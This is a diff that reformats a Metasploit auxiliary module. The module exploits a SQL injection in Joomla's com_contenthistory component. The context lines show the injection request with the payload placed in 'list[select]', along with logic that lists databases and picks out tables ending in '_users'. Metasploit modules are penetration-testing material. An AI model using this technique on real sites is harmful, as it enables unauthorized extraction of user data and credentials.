@@ -25,8 +25,8 @@ class Metasploit4 < Msf::Auxiliary
       'Author'         =>
         [
           'Asaf Orpani', # discovery
-          'bperry', # metasploit module
-          'Nixawk' # module review
+          'bperry',      # metasploit module
+          'Nixawk'       # module review
         ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => 'Oct 22 2015'
@@ -57,7 +57,6 @@ class Metasploit4 < Msf::Auxiliary
     else
       Msf::Exploit::CheckCode::Safe
     end
-
   end
 
   def request(query, payload, lmark, rmark)
@@ -90,6 +89,7 @@ class Metasploit4 < Msf::Auxiliary
     %w(performance_schema information_schema mysql).each do |dbname|
       dbs.delete(dbname) if dbs.include?(dbname)
     end
+
     dbs
   end
 
@@ -113,6 +113,7 @@ class Metasploit4 < Msf::Auxiliary
       vprint_good(tbname)
       tbs << tbname if tbname =~ /_users$/
     end
+
     tbs
   end
 
@@ -160,6 +161,7 @@ class Metasploit4 < Msf::Auxiliary
       cols << record
       vprint_status(record.to_s)
     end
+
     cols
   end
 
@@ -192,7 +194,7 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def sqli(payload)
-    send_request_cgi({
+    send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'vars_get' => {
         'option' => 'com_contenthistory',
@@ -202,6 +204,7 @@ class Metasploit4 < Msf::Auxiliary
         'type_id' => 1,
         'list[select]' => '1 ' + payload
       }
-    })
+    )
   end
+
 end
